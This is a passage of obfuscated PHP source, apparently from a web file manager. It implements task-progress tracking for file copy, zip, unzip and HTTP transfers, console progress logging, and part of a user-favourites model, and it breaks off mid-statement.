$²ΗΒΜ–[1835])); Hook::bind($²ΗΒΜ–[1836], array($this, $²ΗΒΜ–[1837])); Hook::bind($²ΗΒΜ–[667], array($this, $²ΗΒΜ–[1838])); $this->sourceModelCopyFlag = !1; Hook::bind($²ΗΒΜ–[1839], array($this, $²ΗΒΜ–[1840])); Hook::bind($²ΗΒΜ–[1841], array($this, $²ΗΒΜ–[1842])); Hook::bind($²ΗΒΜ–[1843], array($this, $²ΗΒΜ–[1844])); $ƒο•±Τ[$²ΗΒΜ–[1845]] = LNG($²ΗΒΜ–[1846]); $ƒο•±Τ[$²ΗΒΜ–[1847]] = 0; $ƒο•±Τ[$²ΗΒΜ–[1848]] = 0; $ƒο•±Τ[$²ΗΒΜ–[1151]] = $²ΗΒΜ–[12]; $ƒο•±Τ[$²ΗΒΜ–[1849]] = $²ΗΒΜ–[12]; $ƒο•±Τ[$²ΗΒΜ–[1850]] = 0; $ƒο•±Τ[$²ΗΒΜ–[1851]] = 0; $ƒο•±Τ[$²ΗΒΜ–[1852]] = 0; if (!$ƒο•±Τ[$²ΗΒΜ–[1679]]) { $ƒο•±Τ[$²ΗΒΜ–[1679]] = LNG($²ΗΒΜ–[1853]); } } protected function endAfter() { $ι‡½„¤ =& $_SERVER[γγάψ½]; Hook::unbind($ι‡½„¤[1824], array($this, $ι‡½„¤[1825])); Hook::unbind($ι‡½„¤[1319], array($this, $ι‡½„¤[1826])); Hook::unbind($ι‡½„¤[1827], array($this, $ι‡½„¤[1828])); Hook::unbind($ι‡½„¤[676], array($this, $ι‡½„¤[1829])); Hook::unbind($ι‡½„¤[677], array($this, $ι‡½„¤[1830])); Hook::unbind($ι‡½„¤[683], array($this, $ι‡½„¤[1831])); Hook::unbind($ι‡½„¤[684], array($this, $ι‡½„¤[1832])); Hook::unbind($ι‡½„¤[679], array($this, $ι‡½„¤[1833])); Hook::unbind($ι‡½„¤[681], array($this, $ι‡½„¤[1834])); Hook::unbind($ι‡½„¤[645], array($this, $ι‡½„¤[1835])); Hook::unbind($ι‡½„¤[642], array($this, $ι‡½„¤[1835])); Hook::unbind($ι‡½„¤[647], array($this, $ι‡½„¤[1835])); Hook::unbind($ι‡½„¤[649], array($this, $ι‡½„¤[1835])); Hook::unbind($ι‡½„¤[651], array($this, $ι‡½„¤[1835])); Hook::unbind($ι‡½„¤[1836], array($this, $ι‡½„¤[1837])); Hook::unbind($ι‡½„¤[667], array($this, $ι‡½„¤[1838])); Hook::unbind($ι‡½„¤[1839], array($this, $ι‡½„¤[1840])); Hook::unbind($ι‡½„¤[1841], array($this, $ι‡½„¤[1842])); Hook::unbind($ι‡½„¤[1843], array($this, $ι‡½„¤[1844])); } public function copyMoveStart($άτο¶Ό, $¤Ά­άΖ‰, $¶¬πΊµ, $Υ’ψ―ιζ) { $¥‚Ζ‰Α =& $_SERVER[γγάψ½]; self::log($¥‚Ζ‰Α[1854] . $¤Ά­άΖ‰ . $¥‚Ζ‰Α[73] . $Υ’ψ―ιζ); $‚…­ο = rtrim(TEMP_FILES, $¥‚Ζ‰Α[8]); if (substr($¤Ά­άΖ‰, 0, strlen($‚…­ο)) == $‚…­ο) { return; } if (substr($Υ’ψ―ιζ, 0, strlen($‚…­ο)) == $‚…­ο) { return; } $®Φφχβ =& $this->task; $®Φφχβ[$¥‚Ζ‰Α[1855]] = KodIO::transferType($άτο¶Ό, $¶¬πΊµ); $this->update(); } public function updateAfter() { $–ΉΐΫ΅ =& $_SERVER[γγάψ½]; $Υ“Σ =& $this->task; if (!$Υ“Σ[$–ΉΐΫ΅[838]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($Υ“Σ[$–ΉΐΫ΅[1855]] == $–ΉΐΫ΅[1420]) { return; } self::updateTask($Υ“Σ); } private static function updateTask(&$·Ίο™υΕ) { $Έψπφ•ι =& $_SERVER[γγάψ½]; if ($·Ίο™υΕ[$Έψπφ•ι[1855]] == $Έψπφ•ι[1290] || $·Ίο™υΕ[$Έψπφ•ι[1855]] == $Έψπφ•ι[110]) { if ($·Ίο™υΕ[$Έψπφ•ι[1849]]) { $·Ίο™υΕ[$Έψπφ•ι[1852]] = $·Ίο™υΕ[$Έψπφ•ι[1851]] + $·Ίο™υΕ[$Έψπφ•ι[1848]]; } } else { if ($·Ίο™υΕ[$Έψπφ•ι[1855]] == $Έψπφ•ι[1421]) { if ($·Ίο™υΕ[$Έψπφ•ι[1849]] == $Έψπφ•ι[1290]) { $·Ίο™υΕ[$Έψπφ•ι[1852]] = $·Ίο™υΕ[$Έψπφ•ι[1851]] + $·Ίο™υΕ[$Έψπφ•ι[1848]] * 0.5; } else { if ($·Ίο™υΕ[$Έψπφ•ι[1849]] == $Έψπφ•ι[110]) { $·Ίο™υΕ[$Έψπφ•ι[1852]] = $·Ίο™υΕ[$Έψπφ•ι[1851]] + $·Ίο™υΕ[$Έψπφ•ι[1847]] * 0.5 + $·Ίο™υΕ[$Έψπφ•ι[1848]] * 0.5; } } } } $·Ίο™υΕ[$Έψπφ•ι[1795]] = $·Ίο™υΕ[$Έψπφ•ι[1852]] / $·Ίο™υΕ[$Έψπφ•ι[838]]; if ($·Ίο™υΕ[$Έψπφ•ι[1795]] > 0) { $τΈ®¶³μ = timeFloat() - $·Ίο™υΕ[$Έψπφ•ι[1797]] - $·Ίο™υΕ[$Έψπφ•ι[1800]]; $·Ίο™υΕ[$Έψπφ•ι[1801]] = $τΈ®¶³μ * (1 - $·Ίο™υΕ[$Έψπφ•ι[1795]]) / $·Ίο™υΕ[$Έψπφ•ι[1795]]; } } public function addPath($ΐ«Β¤¨‘) { $‚Μΰ›‰ =& $_SERVER[γγάψ½]; if (!$ΐ«Β¤¨‘) { return; } $£σΏ‚ξω =& $this->task; $Ρƒε€― = IO::infoWithChildren($ΐ«Β¤¨‘); $Ύ¥ΧύΛ¥ = $£σΏ‚ξω[$‚Μΰ›‰[1856]] ? $£σΏ‚ξω[$‚Μΰ›‰[1856]][$‚Μΰ›‰[1857]] : 0; $£σΏ‚ξω[$‚Μΰ›‰[1856]] = array($‚Μΰ›‰[1857] => $Ύ¥ΧύΛ¥ + 1, $‚Μΰ›‰[497] => $Ρƒε€―[$‚Μΰ›‰[32]], $‚Μΰ›‰[87] => $Ρƒε€―[$‚Μΰ›‰[87]], $‚Μΰ›‰[587] => $Ρƒε€―[$‚Μΰ›‰[587]] ? $Ρƒε€―[$‚Μΰ›‰[587]] : $Ρƒε€―[$‚Μΰ›‰[87]]); if ($Ρƒε€―[$‚Μΰ›‰[33]] == $‚Μΰ›‰[233]) { $£σΏ‚ξω[$‚Μΰ›‰[1149]] += 1; } else { $£σΏ‚ξω[$‚Μΰ›‰[1149]] += $Ρƒε€―[$‚Μΰ›‰[82]][$‚Μΰ›‰[80]]; if ($Ρƒε€―[$‚Μΰ›‰[194]]) { $£σΏ‚ξω[$‚Μΰ›‰[1149]] += $Ρƒε€―[$‚Μΰ›‰[82]][$‚Μΰ›‰[81]] + 1; } } $£σΏ‚ξω[$‚Μΰ›‰[838]] += $Ρƒε€―[$‚Μΰ›‰[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ή»Ϊ΅Ήλ) { } public function sourceAddHashEnd($‹²ϊΜµ) { } public function sourceAddFileStart($ΒκΤ΅) { $΄Θ•¦· =& $_SERVER[γγάψ½]; $έΦφΎό =& $this->task; $έΦφΎό[$΄Θ•¦·[1847]] = $ΒκΤ΅[$΄Θ•¦·[79]]; $έΦφΎό[$΄Θ•¦·[1845]] = $ΒκΤ΅[$΄Θ•¦·[32]]; $έΦφΎό[$΄Θ•¦·[1151]] = $ΒκΤ΅[$΄Θ•¦·[32]]; $έΦφΎό[$΄Θ•¦·[1858]] = $ΒκΤ΅[$΄Θ•¦·[87]]; $this->update(); } public function sourceAddFileEnd($ξζΎ) { $τ¨±ν =& $_SERVER[γγάψ½]; $Γε”ηνζ =& $this->task; $Γε”ηνζ[$τ¨±ν[1852]] += $ξζΎ[$τ¨±ν[79]]; $Γε”ηνζ[$τ¨±ν[1858]] = $ξζΎ[$τ¨±ν[87]]; $this->update(1); } public function copyFileStart($πί©ΔΘ, $Σ°™΅τΥ, $Φ¬©ϋΓ­, $εΰΛ™·‰, $ξ°ΠΈ•―, $ώ¶υ­Ϋ) { $ΡπµμΎ =& $_SERVER[γγάψ½]; $»·© = $ξ°ΠΈ•―; if ($»·© == $GLOBALS[$ΡπµμΎ[1859]]) { $»·© = $GLOBALS[$ΡπµμΎ[1860]]; } $GLOBALS[$ΡπµμΎ[1860]] = $ξ°ΠΈ•―; $GLOBALS[$ΡπµμΎ[1859]] = $ώ¶υ­Ϋ; $®ω =& $this->task; $®ω[$ΡπµμΎ[1845]] = $»·©; $®ω[$ΡπµμΎ[1847]] = (int) $πί©ΔΘ->size($Σ°™΅τΥ); $®ω[$ΡπµμΎ[1848]] = 0; $®ω[$ΡπµμΎ[1151]] = $ΡπµμΎ[12]; $®ω[$ΡπµμΎ[1849]] = $ΡπµμΎ[12]; $®ω[$ΡπµμΎ[1850]] = 0; $Ι‹¨ƒμ = $®ω[$ΡπµμΎ[1847]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($®ω[$ΡπµμΎ[478]] . $ΡπµμΎ[1861]); if ($Ι‹¨ƒμ && file_exists(get_path_father($εΰΛ™·‰))) { Cache::set($®ω[$ΡπµμΎ[478]] . $ΡπµμΎ[1861], $εΰΛ™·‰); $®ω[$ΡπµμΎ[1818]] = array($ΡπµμΎ[1862], $ΡπµμΎ[1863]); } $this->update(0, $Ι‹¨ƒμ); } public static function updateCopyLocalFileSize($Α…®―) { $ΰΛλσ© =& $_SERVER[γγάψ½]; $ησ¨όΥ¤ = Cache::get($Α…®―[$ΰΛλσ©[478]] . $ΰΛλσ©[1861]); if (!$ησ¨όΥ¤ || !file_exists($ησ¨όΥ¤)) { return $Α…®―; } $Α…®―[$ΰΛλσ©[1848]] = @filesize($ησ¨όΥ¤); $Α…®―[$ΰΛλσ©[1852]] += $Α…®―[$ΰΛλσ©[1848]]; self::updateTask($Α…®―); return $Α…®―; } public function copyFileEnd($‹ΎΕ‚±Ρ, $γ… ¶¤π, $Ψ¨ΔΛ’, $κ§κΑι, $Ι¦ƒ£πΆ, $­ήΡΞƒ“) { $κοΌ‹¦ =& $_SERVER[γγάψ½]; $έΑ›έ¶® =& $this->task; $έΑ›έ¶®[$κοΌ‹¦[1848]] = $έΑ›έ¶®[$κοΌ‹¦[1847]]; $έΑ›έ¶®[$κοΌ‹¦[1849]] = $κοΌ‹¦[12]; unset($έΑ›έ¶®[$κοΌ‹¦[1818]]); if ($Ι¦ƒ£πΆ == $έΑ›έ¶®[$κοΌ‹¦[1845]]) { $έΑ›έ¶®[$κοΌ‹¦[1851]] += $έΑ›έ¶®[$κοΌ‹¦[1847]]; $έΑ›έ¶®[$κοΌ‹¦[1852]] = $έΑ›έ¶®[$κοΌ‹¦[1851]]; $ΗϊΆ”ο = 1; if (isset($έΑ›έ¶®[$κοΌ‹¦[1858]]) && $έΑ›έ¶®[$κοΌ‹¦[1858]] == $γ… ¶¤π) { $ΗϊΆ”ο = 0; } $this->update($ΗϊΆ”ο); } else { $this->update(); $έΑ›έ¶®[$κοΌ‹¦[1848]] = 0; } Cache::remove($έΑ›έ¶®[$κοΌ‹¦[478]] . $κοΌ‹¦[1861]); self::log($κοΌ‹¦[1864] . $γ… ¶¤π . $κοΌ‹¦[73] . $κ§κΑι . $κοΌ‹¦[288] . $Ι¦ƒ£πΆ . $κοΌ‹¦[1865] . $έΑ›έ¶®[$κοΌ‹¦[1845]]); } public function updateFileEnd($τΈ–ω°, $Τ“φ‹Πτ) { $ξ‘ΏΖ =& $_SERVER[γγάψ½]; $ϊƒΥΧ¬Ϊ =& $this->task; $ϊƒΥΧ¬Ϊ[$ξ‘ΏΖ[1845]] = $τΈ–ω°; $ϊƒΥΧ¬Ϊ[$ξ‘ΏΖ[1847]] = $Τ“φ‹Πτ; $ϊƒΥΧ¬Ϊ[$ξ‘ΏΖ[1851]] += $Τ“φ‹Πτ; $ϊƒΥΧ¬Ϊ[$ξ‘ΏΖ[1852]] = $ϊƒΥΧ¬Ϊ[$ξ‘ΏΖ[1851]]; $this->update(1); self::log($ξ‘ΏΖ[1866] . $τΈ–ω°); } public function sourceModelCopy($΅…•¨ο) { $‰Ξγγ =& $_SERVER[γγάψ½]; $ΛΪ“π = $΅…•¨ο[0]; $φφ΅’―§ = $΅…•¨ο[1]; $„‡έσ =& $this->task; $this->sourceModelCopyFlag = !0; $ήΙτή› = 0; switch ($ΛΪ“π) { case $‰Ξγγ[643]: $ήΙτή› = 1; break; case $‰Ξγγ[646]: $„‡έσ[$‰Ξγγ[1845]] = $φφ΅’―§[$‰Ξγγ[32]]; break; case $‰Ξγγ[648]: $ήΙτή› = intval($΅…•¨ο[$‰Ξγγ[459]] * 0.4); break; case $‰Ξγγ[650]: $ήΙτή› = intval($΅…•¨ο[$‰Ξγγ[459]] * 0.2); break; case $‰Ξγγ[652]: $ήΙτή› = intval($΅…•¨ο[$‰Ξγγ[459]] * 0.4); break; } $this->update($ήΙτή›); $this->sourceModelCopyFlag = !1; } public function sourceRemove($©ωΕώΖς, $“–½°Ύ©) { $ψΫ¥ΌΟ =& $_SERVER[γγάψ½]; $this->sourceModelCopyFlag = !0; $½ψΧΔ = 1; if (isset($©ωΕώΖς[$ψΫ¥ΌΟ[82]])) { $½ψΧΔ = $©ωΕώΖς[$ψΫ¥ΌΟ[82]][$ψΫ¥ΌΟ[80]]; $½ψΧΔ = $½ψΧΔ + $©ωΕώΖς[$ψΫ¥ΌΟ[82]][$ψΫ¥ΌΟ[81]] + 1; } $this->update($½ψΧΔ); $this->sourceModelCopyFlag = !1; } public function sourceMove($οέ™μ¶) { $this->sourceRemove($οέ™μ¶, !1); } public function curlProgress($›ΌΔ, $£­ο­οθ, $ΰ¥•²Ϋ, $¨αµΨ³, $Αοψν“ή) { $Ά…¬©²› =& $_SERVER[γγάψ½]; $ήβΉ­»‚ =& $this->task; if ($Αοψν“ή > 0) { $ήβΉ­»‚[$Ά…¬©²›[1151]] = $Ά…¬©²›[1867]; $ήβΉ­»‚[$Ά…¬©²›[1849]] = $Ά…¬©²›[110]; if ($ήβΉ­»‚[$Ά…¬©²›[1847]]) { $ήβΉ­»‚[$Ά…¬©²›[1848]] = $Αοψν“ή; } if ($ήβΉ­»‚[$Ά…¬©²›[1850]]) { $ήβΉ­»‚[$Ά…¬©²›[1848]] = $Αοψν“ή + $ήβΉ­»‚[$Ά…¬©²›[1850]]; } } else { if ($ΰ¥•²Ϋ > 0) { if ($ήβΉ­»‚[$Ά…¬©²›[1847]] == $£­ο­οθ) { $ήβΉ­»‚[$Ά…¬©²›[1848]] = $ΰ¥•²Ϋ; $ήβΉ­»‚[$Ά…¬©²›[1151]] = $Ά…¬©²›[1868]; $ήβΉ­»‚[$Ά…¬©²›[1849]] = $Ά…¬©²›[1290]; } } } $this->update(); } public function curlProgressStart($•ΔπιΊ) { } public function curlProgressEnd($ϋΈξ…Λ) { $β΅ώ’όΦ =& $_SERVER[γγάψ½]; $†ό’οΞΥ =& $this->task; $“¨π±‰ = curl_getinfo($ϋΈξ…Λ); $νΕµΫ»Ξ = $“¨π±‰[$β΅ώ’όΦ[1869]]; if ($νΕµΫ»Ξ == -1) { $νΕµΫ»Ξ = $“¨π±‰[$β΅ώ’όΦ[1870]]; } if ($†ό’οΞΥ[$β΅ώ’όΦ[1849]] == $β΅ώ’όΦ[110] && $νΕµΫ»Ξ) { $†ό’οΞΥ[$β΅ώ’όΦ[1850]] += $νΕµΫ»Ξ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $ΎλΧµη =& $_SERVER[γγάψ½]; $Ιΰ†Λ =& $this->task; $Ιΰ†Λ[$ΎλΧµη[1871]] = 1; Hook::bind($ΎλΧµη[1839], array($this, $ΎλΧµη[1872])); Hook::bind($ΎλΧµη[1841], array($this, $ΎλΧµη[1873])); Hook::bind($ΎλΧµη[1843], array($this, $ΎλΧµη[1874])); } protected function endAfter() { $Ή…΅™ζΫ =& $_SERVER[γγάψ½]; Hook::unbind($Ή…΅™ζΫ[1839], array($this, $Ή…΅™ζΫ[1872])); Hook::unbind($Ή…΅™ζΫ[1841], array($this, $Ή…΅™ζΫ[1873])); Hook::unbind($Ή…΅™ζΫ[1843], array($this, $Ή…΅™ζΫ[1874])); } public function progressStart($©®΄λ›¨) { $υθύΟ =& $_SERVER[γγάψ½]; $Ϊ©ώτ = curl_getinfo($©®΄λ›¨); self::log($υθύΟ[1875] . $Ϊ©ώτ[$υθύΟ[385]]); self::valueSet($this->task[$υθύΟ[478]], $this->task); } public function progressEnd($ά”ΈΩ) { $ ―½Ε‘ =& $_SERVER[γγάψ½]; self::log($ ―½Ε‘[1876] . $this->task[$ ―½Ε‘[478]]); $this->end(); } public function progress($µ¥ςΉβΤ, $Ό’Κ½, $Ρ‚Αγ, $«Σ‚Β, $ΠΔαΠδ„) { $δ‰Υ―ε =& $_SERVER[γγάψ½]; $χ©“‹ =& $this->task; if ($ΠΔαΠδ„ > 0) { $χ©“‹[$δ‰Υ―ε[1149]] = $χ©“‹[$δ‰Υ―ε[1149]] == 0 ? $«Σ‚Β : $χ©“‹[$δ‰Υ―ε[1149]]; $χ©“‹[$δ‰Υ―ε[1794]] = $ΠΔαΠδ„; } else { if ($Ρ‚Αγ > 0) { $χ©“‹[$δ‰Υ―ε[1149]] = $χ©“‹[$δ‰Υ―ε[1149]] == 0 ? $Ό’Κ½ : $χ©“‹[$δ‰Υ―ε[1149]]; $χ©“‹[$δ‰Υ―ε[1794]] = $Ρ‚Αγ; } } $this->update(); self::log("\x70\162\x6f\x67\162\x65\163\x73\110\x74\x74\x70\x3a\144\x6f\x77\156\72{$Ρ‚Αγ}\x2f{$Ό’Κ½}\x3b\x20\165\160\154\x6f\141\x64\x3a{$ΠΔαΠδ„}\x2f{$«Σ‚Β}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ίί³η™π, $¥³·ωθψ = '', $»ψΈαΚΆ = 0, $ςΕδδέ = '') { $ΫΩΪ® =& $_SERVER[γγάψ½]; $ςΕδδέ = $ςΕδδέ ? $ςΕδδέ : ($¥³·ωθψ ? $¥³·ωθψ : $ίί³η™π); $»¬™¬λζ = new Task($ίί³η™π, $¥³·ωθψ, $»ψΈαΚΆ, $ςΕδδέ); $GLOBALS[$ΫΩΪ®[1877] . $ίί³η™π] = new TaskLog($ΫΩΪ®[1776], $»¬™¬λζ, $ςΕδδέ); return $»¬™¬λζ; } public function __construct($ο”ρ–¶¬ = '', $›έπ· = '', $Κ²ΓβϋΥ = '') { $Ώ”‘ΉΪ =& $_SERVER[γγάψ½]; if (!$ο”ρ–¶¬) { $ο”ρ–¶¬ = $Ώ”‘ΉΪ[1776]; } $κ©κ¥Ϊ = $ο”ρ–¶¬ . $Ώ”‘ΉΪ[465] . rand_string(10); if (!$Κ²ΓβϋΥ) { $Κ²ΓβϋΥ = $ο”ρ–¶¬ . $Ώ”‘ΉΪ[53] . $Κ²ΓβϋΥ; } switch ($ο”ρ–¶¬) { case $Ώ”‘ΉΪ[1776]: if (!$›έπ· || !$›έπ·->task) { return echoLog($ο”ρ–¶¬ . $Ώ”‘ΉΪ[1878]); } $Ά“ΡκΦ = $›έπ·; $κ©κ¥Ϊ = $Ά“ΡκΦ->task[$Ώ”‘ΉΪ[478]]; $ο”ρ–¶¬ = $Ά“ΡκΦ->task[$Ώ”‘ΉΪ[478]]; if (!$Ά“ΡκΦ->task[$Ώ”‘ΉΪ[1679]]) { $Ά“ΡκΦ->task[$Ώ”‘ΉΪ[1679]] = $Κ²ΓβϋΥ ? $Κ²ΓβϋΥ : $ο”ρ–¶¬; } break; case $Ώ”‘ΉΪ[1879]: if (!$›έπ·) { return echoLog($ο”ρ–¶¬ . $Ώ”‘ΉΪ[1880]); } $ΘζΛΜϋΪ = is_string($›έπ·) ? array($›έπ·) : $›έπ·; $Ά“ΡκΦ = new TaskFileTransfer($κ©κ¥Ϊ, $ο”ρ–¶¬, 0, $Κ²ΓβϋΥ ? $Κ²ΓβϋΥ : $ΘζΛΜϋΪ[0]); foreach ($ΘζΛΜϋΪ as $‚†›ζο“) { $Ά“ΡκΦ->addPath($‚†›ζο“); } break; case $Ώ”‘ΉΪ[391]: if (!$›έπ·) { return echoLog($ο”ρ–¶¬ . $Ώ”‘ΉΪ[1880]); } $ΘζΛΜϋΪ = is_string($›έπ·) ? array($›έπ·) : $›έπ·; $Ά“ΡκΦ = new TaskZip($κ©κ¥Ϊ, $ο”ρ–¶¬, 0, $Κ²ΓβϋΥ ? $Κ²ΓβϋΥ : $ΘζΛΜϋΪ[0]); foreach ($ΘζΛΜϋΪ as $‚†›ζο“) { $Ά“ΡκΦ->addPath($‚†›ζο“); } break; case $Ώ”‘ΉΪ[1310]: if (!$›έπ·) { return echoLog($ο”ρ–¶¬ . $Ώ”‘ΉΪ[1880]); } $Ά“ΡκΦ = new TaskUnZip($κ©κ¥Ϊ, $ο”ρ–¶¬, 0, $Κ²ΓβϋΥ ? $Κ²ΓβϋΥ : $›έπ·); if ($›έπ·) { $Ά“ΡκΦ->addFile($›έπ·); } break; case $Ώ”‘ΉΪ[152]: $Ά“ΡκΦ = new TaskHttp($κ©κ¥Ϊ, $ο”ρ–¶¬); break; default: return; break; } $this->task = $Ά“ΡκΦ; $this->taskID = $κ©κ¥Ϊ; Hook::bind($Ώ”‘ΉΪ[1814], array($this, $Ώ”‘ΉΪ[1881])); Hook::bind($Ώ”‘ΉΪ[1816], array($this, $Ώ”‘ΉΪ[1882])); Hook::bind($Ώ”‘ΉΪ[1810], array($this, $Ώ”‘ΉΪ[1883])); echoLog($Ώ”‘ΉΪ[1884] . $Ά“ΡκΦ->task[$Ώ”‘ΉΪ[1679]]); } public function __destruct() { $this->end(); } public function end($™ύβϊζώ = '') { $•ηυ‚¤“ =& $_SERVER[γγάψ½]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($™ύβϊζώ); $this->task = !1; $this->taskID = !1; Hook::unbind($•ηυ‚¤“[1814], array($this, $•ηυ‚¤“[1881])); Hook::unbind($•ηυ‚¤“[1816], array($this, $•ηυ‚¤“[1882])); Hook::unbind($•ηυ‚¤“[1810], array($this, $•ηυ‚¤“[1883])); } public function taskUpdate($‡ψΡΠαώ) { $¦΄®¤ΎΦ =& $_SERVER[γγάψ½]; if (!$‡ψΡΠαώ || $this->taskID != $‡ψΡΠαώ[$¦΄®¤ΎΦ[478]]) { return; } $ΟφθΛϊ = 20; $©Ύ«‰² = intval($‡ψΡΠαώ[$¦΄®¤ΎΦ[1795]] * $ΟφθΛϊ); $έΓθΟ = $¦΄®¤ΎΦ[176] . str_repeat($¦΄®¤ΎΦ[509], $©Ύ«‰²) . $¦΄®¤ΎΦ[1100] . str_repeat($¦΄®¤ΎΦ[53], $ΟφθΛϊ - $©Ύ«‰²) . $¦΄®¤ΎΦ[178]; $ΖΕζ± = $έΓθΟ . sprintf($¦΄®¤ΎΦ[1885], $‡ψΡΠαώ[$¦΄®¤ΎΦ[1795]] * 100) . $¦΄®¤ΎΦ[1886]; $€ΪΙ¤–Κ = $ΖΕζ± . $‡ψΡΠαώ[$¦΄®¤ΎΦ[1794]] . $¦΄®¤ΎΦ[8] . $‡ψΡΠαώ[$¦΄®¤ΎΦ[1149]] . LNG($¦΄®¤ΎΦ[1887]); $Έ‰ΎΩη‚ = $¦΄®¤ΎΦ[12]; if ($‡ψΡΠαώ[$¦΄®¤ΎΦ[1871]]) { $€ΪΙ¤–Κ = $ΖΕζ± . size_format($‡ψΡΠαώ[$¦΄®¤ΎΦ[1794]]) . $¦΄®¤ΎΦ[8] . size_format($‡ψΡΠαώ[$¦΄®¤ΎΦ[1149]]); $Έ‰ΎΩη‚ = size_format($‡ψΡΠαώ[$¦΄®¤ΎΦ[1796]]) . $¦΄®¤ΎΦ[1888]; } if ($‡ψΡΠαώ[$¦΄®¤ΎΦ[1151]]) { $‡ψΡΠαώ[$¦΄®¤ΎΦ[1845]] = $‡ψΡΠαώ[$¦΄®¤ΎΦ[1151]] . $¦΄®¤ΎΦ[53] . $‡ψΡΠαώ[$¦΄®¤ΎΦ[1845]]; } if ($‡ψΡΠαώ[$¦΄®¤ΎΦ[1845]]) { $ΪΧ™™·• = $¦΄®¤ΎΦ[12]; if ($‡ψΡΠαώ[$¦΄®¤ΎΦ[1847]]) { $ΪΧ™™·• = $¦΄®¤ΎΦ[50] . size_format($‡ψΡΠαώ[$¦΄®¤ΎΦ[1848]]) . $¦΄®¤ΎΦ[8] . size_format($‡ψΡΠαώ[$¦΄®¤ΎΦ[1847]]); } $Έ‰ΎΩη‚ .= $‡ψΡΠαώ[$¦΄®¤ΎΦ[1845]] . $ΪΧ™™·•; } if ($‡ψΡΠαώ[$¦΄®¤ΎΦ[838]] && !$‡ψΡΠαώ[$¦΄®¤ΎΦ[1847]]) { $Έ‰ΎΩη‚ .= $¦΄®¤ΎΦ[53] . size_format($‡ψΡΠαώ[$¦΄®¤ΎΦ[1852]]) . $¦΄®¤ΎΦ[8] . size_format($‡ψΡΠαώ[$¦΄®¤ΎΦ[838]]); } echoLog($€ΪΙ¤–Κ . $¦΄®¤ΎΦ[53] . $Έ‰ΎΩη‚, !0); } public function taskEnd($¬¤„Λε) { $›£ζ¤ =& $_SERVER[γγάψ½]; if (!$¬¤„Λε || $this->taskID != $¬¤„Λε[$›£ζ¤[478]]) { return; } $—Ι‘χ’ = $¬¤„Λε ? LNG($›£ζ¤[1889]) . $›£ζ¤[4] . $¬¤„Λε[$›£ζ¤[1794]] . $›£ζ¤[8] . $¬¤„Λε[$›£ζ¤[1149]] . LNG($›£ζ¤[1887]) . $›£ζ¤[74] : $›£ζ¤[12]; echoLog($›£ζ¤[1890] . $¬¤„Λε[$›£ζ¤[1679]] . ($¬¤„Λε[$›£ζ¤[529]] ? $›£ζ¤[74] . $¬¤„Λε[$›£ζ¤[529]] : $›£ζ¤[12]) . $›£ζ¤[74] . $—Ι‘χ’ . $›£ζ¤[1891] . sprintf($›£ζ¤[932], timeFloat() - $¬¤„Λε[$›£ζ¤[1797]]) . $›£ζ¤[1809]); $this->end(); } public function taskKill($‘Έ€ΌάΆ) { $Ύέ‘Πυ =& $_SERVER[γγάψ½]; if (!$‘Έ€ΌάΆ || $this->taskID != $‘Έ€ΌάΆ[$Ύέ‘Πυ[478]]) { return; } echoLog($Ύέ‘Πυ[1892] . $‘Έ€ΌάΆ[$Ύέ‘Πυ[1679]]); } } goto b‡γΌΪά¤; BΙ°ΞΤζΖ: class UserFavModel extends ModelBase { protected $tableName = "\165\x73\145\162\137\146\x61\166"; protected function cacheFunctionAlias($ΈΗΨγ―) { $ψυη±χ =& $_SERVER[γγάψ½]; return array($ψυη±χ[2109] => array(USER_ID, $ψυη±χ[2485])); } protected function listData() { $βε³κΕ =& $_SERVER[γγάψ½]; $ ””ΐ = array($βε³κΕ[1784] => USER_ID, $βε³κΕ[562] => 0); $—„‘­ι = $βε³κΕ[2486]; $µΏΐγσ„ = $this->field($—„‘­ι)->where($ ””ΐ)->order($βε³κΕ[2487])->select(); return $µΏΐγσ„ ? $µΏΐγσ„ : array(); } protected function resetCache() { } protected function listView() { $‚ή·Ν³Θ =& $_SERVER[γγάψ½]; $“Θ–ΚΔπ = $this->listData(); $Ι®Ή = array_filter_by_field($“Θ–ΚΔπ, $‚ή·Ν³Θ[33], $‚ή·Ν³Θ[493]); $¥‘’ƒ = array_to_keyvalue($Ι®Ή, $‚ή·Ν³Θ[12], $‚ή·Ν³Θ[87]); if (!$¥‘’ƒ) { return $“Θ–ΚΔπ; } $£σΟ = 2000; $¨υβπΐΕ = array($‚ή·Ν³Θ[494] => array($‚ή·Ν³Θ[495], $¥‘’ƒ)); $ί‚°Ό² = Model($‚ή·Ν³Θ[905])->listSource($¨υβπΐΕ, $£σΟ); $ί‚°Ό² = array_merge($ί‚°Ό²[$‚ή·Ν³Θ[86]], $ί‚°Ό²[$‚ή·Ν³Θ[85]]); $ί‚°Ό² = array_to_keyvalue($ί‚°Ό², $‚ή·Ν³Θ[194]); foreach ($“Θ–ΚΔπ as $έ‹ΤΜ®ά => $±Β³ψΒ) { $Ζ–κ§Έ = $ί‚°Ό²[$±Β³ψΒ[$‚ή·Ν³Θ[87]]]; $Ζ–κ§Έ = $Ζ–κ§Έ ? $Ζ–κ§Έ : array(); $“Θ–ΚΔπ[$έ‹ΤΜ®ά] = array_merge($Ζ–κ§Έ, $±Β³ψΒ); } return $“Θ–ΚΔπ; } protected function addFav($λ©Ρλψω, $χΡ’‚ƒΰ = '', $Ψ©£–πα = "\x73\157\165\x72\143\145") { $¥»ƒπΫΠ =& $_SERVER[γγάψ½]; $­ΏΗΪ§ε = array($¥»ƒπΫΠ[1784] => USER_ID, $¥»ƒπΫΠ[562] => 0, $¥»ƒπΫΠ[499] => $Ψ©£–πα, $¥»ƒπΫΠ[498] => $λ©Ρλψω); if ($this->where($­ΏΗΪ§ε)->find()) { return !1; } $­ΏΗΪ§ε = array($¥»ƒπΫΠ[1784] => USER_ID, $¥»ƒπΫΠ[562] => 0); $ΆιώΜΣƒ = $this->where($­ΏΗΪ§ε)->max($¥»ƒπΫΠ[2017]); if (!$ΆιώΜΣƒ) { $ΆιώΜΣƒ = 0; } if (!$χΡ’‚ƒΰ && $Ψ©£–πα == $¥»ƒπΫΠ[493]) { $κΗΆ£ώ = 